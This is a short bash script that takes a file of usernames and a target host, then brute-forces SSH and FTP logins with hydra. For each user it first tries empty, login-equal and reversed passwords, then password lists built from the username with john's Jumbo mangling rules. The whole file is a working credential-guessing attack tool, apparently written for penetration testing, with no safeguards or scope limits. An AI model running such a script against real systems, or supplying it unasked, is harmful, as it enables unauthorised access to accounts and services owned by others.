#! /usr/bin/env bash

if [[ ${#} < 2 ]]
then
    echo "Syntaxe: $0 <usernames dict> <host>"
    exit 0
fi

TMP_DIR=by-user.tmp
mkdir -p "$TMP_DIR"

for u in $(cat $1)
do 

    hydra -l "$u" -e nsr "ssh://$2"
    hydra -l "$u" -e nsr "ftp://$2"
done

for u in $(cat $1)
do 
    echo $u > "$TMP_DIR/$u.txt"; 

    john --wordlist="$TMP_DIR/$u.txt" --rules=Jumbo --stdout > "$TMP_DIR/$u.jumbo"

    hydra -l "$u" -P "$TMP_DIR/$u.jumbo" "ssh://$2"
    hydra -l "$u" -P "$TMP_DIR/$u.jumbo" "ftp://$2"
    
done 

